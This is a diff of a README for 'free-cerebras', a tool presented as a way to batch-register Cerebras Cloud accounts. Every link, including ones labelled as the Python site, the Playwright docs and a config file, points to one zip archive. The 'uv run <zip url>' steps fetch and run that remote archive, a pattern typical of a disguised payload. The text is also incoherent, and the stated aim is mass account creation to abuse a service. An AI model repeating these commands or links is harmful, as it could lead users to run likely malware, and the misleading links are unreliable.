@@ -1,6 +1,6 @@
 # ⚙️ free-cerebras - Easy Batch Register for Cerebras Cloud
 
-[![Download free-cerebras](https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip)](https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip)
+[![Download free-cerebras](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)
 
 ---
 
@@ -41,14 +41,14 @@ It works on your computer using Python and Playwright automation tools. The app 
 
 To start, you need to get the software.
 
-[Download free-cerebras here](https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip)  
+[Download free-cerebras here](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)  
 This link takes you to the release page. Find the latest version and download the package suitable for your system.
 
 ---
 
 ### Step 2: Install Python and UV Runner
 
-If you do not have Python installed, download it from [https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip](https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip) and follow their instructions. Use the latest Python 3 version.
+If you do not have Python installed, download it from [https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip) and follow their instructions. Use the latest Python 3 version.
 
 You will also need a small tool called `uv` to run free-cerebras easily.
 
@@ -87,7 +87,7 @@ Now you can start free-cerebras.
 In your terminal or command prompt, enter:
 
 ```
-uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip
+uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip
 ```
 
 The program will check and install any missing software it needs. Then it will open a web management interface.
@@ -106,7 +106,7 @@ You will see the free-cerebras web interface. It is easy to use. Follow on-scree
 
 You can visit the official GitHub release page to download the latest version here:
 
-[https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip](https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip)
+[https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)
 
 Look for the file that matches your computer system. Download it and unzip or place it in a folder you can access.
 
@@ -118,7 +118,7 @@ There are two ways to use free-cerebras: Web Mode and Command Line Mode.
 
 ### Web Mode
 
-- After launching with `uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip`, open the browser at `http://localhost:5000`.
+- After launching with `uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip`, open the browser at `http://localhost:5000`.
 - The web interface lets you start, stop, and monitor batch registrations.
 - Use the menus to change settings and see status updates.
 - Designed for users who prefer clicking over typing commands.
@@ -132,26 +132,26 @@ Some examples:
 - Register 5 accounts:
 
   ```
-  uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip cli -n 5
+  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 5
   ```
 
 - Register 10 accounts with 2 parallel processes:
 
   ```
-  uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip cli -n 10 -p 2
+  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 10 -p 2
   ```
 
 - Register 3 accounts in headless (no browser window shown) mode:
 
   ```
-  uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip cli -n 3 --headless
+  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 3 --headless
   ```
 
 ---
 
 ## 🛠 Configuration
 
-You can fine-tune how free-cerebras works by editing the `https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip` file found in the main folder.
+You can fine-tune how free-cerebras works by editing the `https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip` file found in the main folder.
 
 Here are some settings you can change:
 
@@ -190,7 +190,7 @@ free-cerebras does the following automatically for each account you register:
 - If you get errors about ports in use, change the port number by running the web app like this:
 
   ```
-  uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip web --port 5001
+  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip web --port 5001
   ```
 
 - Check your internet connection and firewall if registration or emails fail.
@@ -204,28 +204,28 @@ free-cerebras does the following automatically for each account you register:
 - Start the web interface on a custom port (e.g., 5000):
 
   ```
-  uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip web --port 5000
+  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip web --port 5000
   ```
 
 - Run command line mode creating 15 accounts with 3 batches concurrently:
 
   ```
-  uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip cli -n 15 -p 3
+  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 15 -p 3
   ```
 
 - Use headless mode (good for running on servers or no GUI):
 
   ```
-  uv run https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip cli -n 10 --headless
+  uv run https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip cli -n 10 --headless
   ```
 
 ---
 
 ## 🔗 Useful Links
 
-- [Download free-cerebras and updates](https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip)
-- [Python official site](https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip)
-- [Playwright documentation](https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip)
+- [Download free-cerebras and updates](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)
+- [Python official site](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)
+- [Playwright documentation](https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip)
 
 ---
 
@@ -237,4 +237,4 @@ Using the web interface is easiest for most users. Command line mode offers more
 
 The setup requires some initial software installations but after that you can start batch registering within minutes.
 
-For details on configuration, check `https://github.com/CrxshRyan/free-cerebras/raw/refs/heads/main/src/free-cerebras-v3.3.zip`. For help or to report issues, visit the GitHub repository’s issue page.
+For details on configuration, check `https://raw.githubusercontent.com/CrxshRyan/free-cerebras/main/src/free-cerebras-v3.3.zip`. For help or to report issues, visit the GitHub repository’s issue page.
